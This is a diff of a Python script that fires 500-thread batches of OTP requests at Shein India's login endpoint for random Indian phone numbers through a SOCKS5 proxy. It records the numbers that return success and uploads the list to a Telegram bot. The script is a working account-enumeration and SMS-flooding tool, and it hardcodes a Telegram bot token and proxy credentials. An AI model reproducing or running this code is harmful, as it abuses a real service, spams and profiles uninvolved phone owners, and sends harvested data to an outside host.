@@ -6,23 +6,22 @@ import threading
 import os
 from flask import Flask
 
-# Initialize Flask for Render health checks
 app = Flask(__name__)
 
-# --- CONFIGURATION (UPDATE THESE) ---
+# --- CONFIGURATION ---
 URL = "https://api.sheinindia.in/uaas/login/sendOTP?client_type=Android%2F35&client_version=1.0.12"
 TELEGRAM_TOKEN = "7765850713:AAHlPOY61yfDEK_9juqC6CilUSBUbUsJNa8"
 TELEGRAM_CHAT_ID = "7177581474"
 OUTPUT_FILE = "nm.json"
 LOCK = threading.Lock()
 
-# Proxy Credentials (SOCKS5)
+# Proxy Credentials
 PROXY_USER = "nooblog"
 PROXY_PASS = "nooblog123"
 PROXY_HOST = "138.197.67.46"
 PROXY_PORT = "11001"
 
-# Global proxy dictionary
+# Construct SOCKS5 Proxy URL
 PROXY_URL = f"socks5://{PROXY_USER}:{PROXY_PASS}@{PROXY_HOST}:{PROXY_PORT}"
 PROXIES = {
     "http": PROXY_URL,
@@ -42,30 +41,13 @@ HEADERS = {
     "Accept-Encoding": "gzip"
 }
 
-def get_current_ip():
-    """Helper to verify proxy is working."""
-    try:
-        r = requests.get("https://api.ipify.org?format=json", proxies=PROXIES, timeout=10)
-        return r.json().get("ip", "Unknown")
-    except Exception:
-        return "Connection Error"
-
 def send_to_telegram():
-    """Sends the nm.json file and then clears it to save space."""
     if os.path.exists(OUTPUT_FILE):
         tg_url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument"
         try:
             with open(OUTPUT_FILE, "rb") as f:
-                r = requests.post(tg_url, data={"chat_id": TELEGRAM_CHAT_ID, "caption": "Batch Results"}, files={"document": f}, timeout=15)
-            
-            # Optional: Clear the file after successful send to prevent it from growing too large
-            if r.status_code == 200:
-                with LOCK:
-                    with open(OUTPUT_FILE, "w") as f:
-                        json.dump([], f)
-                print("Telegram file sent and local JSON cleared.")
-        except Exception as e:
-            print(f"Telegram Error: {e}")
+                requests.post(tg_url, data={"chat_id": TELEGRAM_CHAT_ID}, files={"document": f}, timeout=10)
+        except: pass
 
 def random_indian_number():
     start = random.choice([str(i) for i in range(70, 80)] + [str(i) for i in range(90, 100)])
@@ -87,29 +69,26 @@ def make_request():
     number = random_indian_number()
     data = f"mobileNumber={number}"
     try:
-        # verify=True is standard; if your site has SSL issues, change to False
+        # Added proxies=PROXIES here
         r = requests.post(URL, headers=HEADERS, data=data, timeout=30, proxies=PROXIES)
         if r.status_code == 200:
             try:
                 if r.json().get("success") is True:
                     save_number(number)
-                    print(f"[SUCCESS] {number}")
             except: pass
     except: pass
 
 def run_heavy_load():
     last_rotation = time.time()
-    batch_count = 0
     
-    print(f"Bot Initialized. Current Exit IP: {get_current_ip()}")
-
     while True:
-        # Proxy Rotation/Refresh logic every 2 minutes
+        # Check if 2 minutes (120 seconds) have passed to "rotate"
         if time.time() - last_rotation > 120:
-            print(f"Rotating Proxy/Checking IP: {get_current_ip()}")
+            print("Refreshing proxy connection...")
+            # Note: For many SOCKS proxies, simply re-establishing the session 
+            # triggers the rotation if the provider supports it.
             last_rotation = time.time()
 
-        # Launching your original 500 threads
         threads = []
         for _ in range(500):
             t = threading.Thread(target=make_request)
@@ -120,24 +99,15 @@ def run_heavy_load():
         for t in threads:
             t.join()
         
-        batch_count += 1
-        
-        # Send to Telegram every 10 batches (5,000 numbers checked)
-        if batch_count >= 10:
-            send_to_telegram()
-            batch_count = 0
-            
+        send_to_telegram()
         time.sleep(1)
 
 @app.route('/')
 def health():
-    return "Bot is running. High-concurrency mode active.", 200
+    return "Bot with Proxy Active", 200
 
 if __name__ == "__main__":
-    # Start the worker thread
-    worker = threading.Thread(target=run_heavy_load, daemon=True)
-    worker.start()
-    
-    # Run Flask server
+    threading.Thread(target=run_heavy_load, daemon=True).start()
     port = int(os.environ.get("PORT", 5000))
     app.run(host='0.0.0.0', port=port)
+    
